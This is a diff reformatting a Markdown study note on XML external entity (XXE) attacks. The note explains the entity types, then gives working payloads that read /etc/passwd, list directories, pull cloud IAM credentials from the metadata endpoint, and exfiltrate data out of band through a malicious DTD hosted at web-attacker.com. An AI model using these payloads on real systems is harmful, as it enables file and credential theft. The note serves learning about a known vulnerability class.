@@ -4,17 +4,18 @@ xml- “extensible markup language”. design for storing and transporting data.
 
  ### XML entities ?
 
-- XML entities are a way of representing an item of data within an XML document
-- It is built-in entities in xml like <; and >; user for less that and grater then in xml
-    
-    example: <Product Id> 
+XML entities are a way of representing an item of data within an XML document.It is built-in entities in xml like <; and >; user for less that and grater then in xml
+   example: <Product Id> 
     
 
 ### Type of entities:
 
-- Internal - entities define within local DTD. the main purpose of the internal entity is to transfer same content again and again like the name of org. lwe can define any where to call the txt and insert the value ex: <!ENTITY foo “bar”> <product>&foo;</product>. make sure entity must be close.
-- external - declared outside of local DTD ex: <!ENTITY foo SYSTEM “file:///etc/passwd>. but we use two entity one is internal to call data and other is external entity to fatch data from the system.
-- parameter - declared into the parameter based entities <! ENTITY % name “entity_value”>
+->Internal - entities define within local DTD. the main purpose of the internal entity is to transfer same content again and again like the name of org. lwe can define any where to call the txt and insert the value                ex: <!ENTITY foo “bar”> <product>&foo;</product>. make sure entity must be close.
+
+-> external - declared outside of local DTD ex: <!ENTITY foo SYSTEM “file:///etc/passwd>. but we use two entity one is internal to call data and other is external entity to fatch data from the system.
+
+-> parameter - declared into the parameter based entities <! ENTITY % name “entity_value”>
+
 
 ### Document type definition(DTD):
 
@@ -50,32 +51,32 @@ Some applications use the XML format to transmit data between the browser and th
 
 first check for new Entity 
 
-- <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY to replace "3"> ]>
-<stockCheck>
-<productId>&toreplace;</productId>
-<storeId>1</storeId>
-</stockCheck>
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY to replace "3"> ]>
+  <stockCheck>
+  <productId>&toreplace;</productId>
+  <storeId>1</storeId>
+ </stockCheck>
 
 ##### read file:
 
-<!--?xml version="1.0" ?-->
-<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
-<data>&example;</data>
+  <!--?xml version="1.0" ?-->
+  <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+  <data>&example;</data>
 
 ##### this case use to extrect a file if server uses PHP
 
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
-<data>&example;</data>
+  <!--?xml version="1.0" ?-->
+  <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>  
+  <data>&example;</data>
 
 #####  third case notice we are declaring the `Element stockCheck` as ANY
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE data [
-<!ELEMENT stockCheck ANY>
-<!ENTITY file SYSTEM "file:///etc/passwd">
-]>
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE data [
+  <!ELEMENT stockCheck ANY>
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+  ]>
 <stockCheck>
 <productId>&file;</productId>
 <storeId>1</storeId>
@@ -85,25 +86,25 @@ first check for new Entity
 
 **list the contents of a directory** via XXE with a payload
 
-<!-- Root / -->
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>
+  <!-- Root / -->
+  <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>
 
-<!-- /etc/ -->
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
+  <!-- /etc/ -->
+  <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
 
 ##### SSRF
 
 XXE is to abuse a ssrf inside  a cloud:
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
-<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+  <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 
 ##### Blind SSRF
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "[http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net](http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net/)"> %xxe; ]>
-<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "[http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net](http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net/)"> %xxe; ]>
+  <stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
 
  ##### "Blind" SSRF - Exfiltrate data out-of-band
     
@@ -113,11 +114,11 @@ XXE is to abuse a ssrf inside  a cloud:
     %eval;
     %exfiltrate;
     
-- To upload malicious.dtd
+#####  To upload malicious.dtd
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
-<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
+   <stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
 
 ##### commaon exploit
 
@@ -127,6 +128,8 @@ XXE is to abuse a ssrf inside  a cloud:
 
 ### refrence:
 
-https://www.w3resource.com/xml/internal-entities.php
-https://d0znpp.medium.com/a4-xml-external-entities-xxe-%EF%B8%8F-top-10-owasp-2017-b9c293c27b0f
-https://rohitcoder.medium.com/comprehensive-guide-detecting-fixing-and-defending-against-xxe-attacks-in-python-and-java-e78691b4b918
+ https://www.w3resource.com/xml/internal-entities.php
+ 
+ https://d0znpp.medium.com/a4-xml-external-entities-xxe-%EF%B8%8F-top-10-owasp-2017-b9c293c27b0f
+ 
+ https://rohitcoder.medium.com/comprehensive-guide-detecting-fixing-and-defending-against-xxe-attacks-in-python-and-java-e78691b4b918
